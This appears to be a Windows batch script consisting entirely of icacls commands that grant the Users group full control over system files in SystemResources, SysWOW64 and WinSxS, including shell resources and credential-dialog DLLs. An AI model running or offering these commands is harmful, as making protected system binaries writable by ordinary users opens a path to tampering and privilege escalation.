icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\Images\TabletMode.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.Shell\pris\Windows.UI.Shell.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Windows.UI.ShellCommon.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\ClockFlyoutExperience\Assets\Fonts\CoreMDL2.1.69.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\DevicesFlowUI\Fonts\MiraMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-100_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-125_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-150_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-200_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\CellularToast.scale-400_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-black_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.contrast-white_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\DefaultSystemNotification.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-black_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.contrast-white_scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\NearShare.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\RibbonToast.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-100_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-125_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-150_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-200_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\SIMLockToast.scale-400_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-100_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-125_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-150_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-200_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerToast.scale-400_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-100_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-125_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-150_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-200_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400_contrast-black.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\Images\WiFiNetworkManagerWarningToast.scale-400_contrast-white.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\NetworkUX\Assets\Fonts\SettingsIcons.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\pris\Windows.UI.ShellCommon.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\QuickActions\Assets\AXPIcons.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\SharePickerUI\Assets\Fonts\SharMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\officehub150x150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\officehub71x71.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\onenote150x150.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\onenote71x71.png" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts\BitMDL2.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommon\StartUI\Assets\Fonts\SkypeUISymbol-Regular.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\Windows.UI.ShellCommonInetCore.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\pris\Windows.UI.ShellCommonInetCore.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets\Fonts" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.ShellCommonInetCore\WindowsInternal.Xaml.Controls.Tabs\Assets\Fonts\BrowserMDL.ttf" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.TaskManager\pris" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.TaskManager\Windows.UI.TaskManager.pri" /t /Grant Users:F
icacls "C:\Windows\SystemResources\Windows.UI.TaskManager\pris\Windows.UI.TaskManager.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Accessibility.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Cred.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.FileExplorer.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.FileExplorer.WASDK.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Immersive.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Input.Inking.Analysis.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Input.Inking.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Search.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Xaml.Controls.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Xaml.InkControls.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Xaml.Maps.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.Xaml.Phone.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\Windows.UI.XamlHost.dll" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\en-US\Windows.UI.Input.Inking.dll.mui" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\WinMetadata\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\SysWOW64\WinMetadata\Windows.UI.Xaml.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\Windows.UI.Accessibility.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\f\Windows.UI.Accessibility.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_6b9bd6e801b27dc0\r\Windows.UI.Accessibility.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\Windows.UI.TaskManager.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\f\Windows.UI.TaskManager.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\r\Windows.UI.TaskManager.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\Windows.UI.TaskManager.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\f\Windows.UI.TaskManager.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\r\Windows.UI.TaskManager.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults.resources_31bf3856ad364e35_10.0.22621.1_en-us_0e504f2e5e6ac911\Windows.UI.AppDefaults.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\Windows.UI.AppDefaults.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\f\Windows.UI.AppDefaults.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\r\Windows.UI.AppDefaults.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-c..ontroller.resources_31bf3856ad364e35_10.0.22621.1_en-us_8cd6df30e4ee1365\Windows.UI.CredDialogController.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\f\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\r\Windows.UI.CredDialogController.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-d..ctui-resourceswin81_31bf3856ad364e35_10.0.22621.1_none_7d7e5e0d80f786f1\Windows.UI.Xaml.Resources.win81.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-d..ui-resourceswin8rtm_31bf3856ad364e35_10.0.22621.1_none_ec48a461d684adc1\Windows.UI.Xaml.Resources.win8rtm.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resources19h1_31bf3856ad364e35_10.0.22621.1_none_52ec67724094312f\Windows.UI.Xaml.Resources.19h1.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resources21h1_31bf3856ad364e35_10.0.22621.1_none_53b46e00400a562e\Windows.UI.Xaml.Resources.21h1.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs1_31bf3856ad364e35_10.0.22621.1_none_bd97a1235581e454\Windows.UI.Xaml.Resources.rs1.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs2_31bf3856ad364e35_10.0.22621.1_none_bd98a16d5580fdab\Windows.UI.Xaml.Resources.rs2.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs3_31bf3856ad364e35_10.0.22621.1_none_bd99a1b755801702\Windows.UI.Xaml.Resources.rs3.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs4_31bf3856ad364e35_10.0.22621.1_none_bd9aa201557f3059\Windows.UI.Xaml.Resources.rs4.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs5_31bf3856ad364e35_10.0.22621.1_none_bd9ba24b557e49b0\Windows.UI.Xaml.Resources.rs5.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesth_31bf3856ad364e35_10.0.22621.1_none_30ff4cd02123fe20\Windows.UI.Xaml.Resources.th.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\Windows.UI.Xaml.Resources.Common.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\f\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\f\Windows.UI.Xaml.Resources.Common.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\r\Windows.UI.Xaml.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\r\Windows.UI.Xaml.Resources.Common.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\Windows.UI.SettingsAppThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\f\Windows.UI.SettingsAppThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\r\Windows.UI.SettingsAppThreshold.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\Windows.UI.SettingsAppThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\f\Windows.UI.SettingsAppThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\r\Windows.UI.SettingsAppThreshold.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\f\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\r\Windows.UI.Core.TextInput.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-p..alog.core.resources_31bf3856ad364e35_10.0.22621.2506_en-us_884c97faf651599e\Windows.UI.PrintDialog.en-US.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-p..d-library.resources_31bf3856ad364e35_10.0.22621.1_en-us_16be39094a98258f\Windows.UI.PicturePassword.dll.mui" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-p..urepassword-library_31bf3856ad364e35_10.0.22621.1_none_72a541ee9cbe801c\Windows.UI.PicturePassword.dll" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-printdialog.core_31bf3856ad364e35_10.0.22621.2506_none_c0ac442099d1239d\Windows.UI.PrintDialog.pri" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\Windows.UI.winmd" /t /Grant Users:F
icacls "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\Windows.UI.Xaml.winmd" /t /Grant Users:F
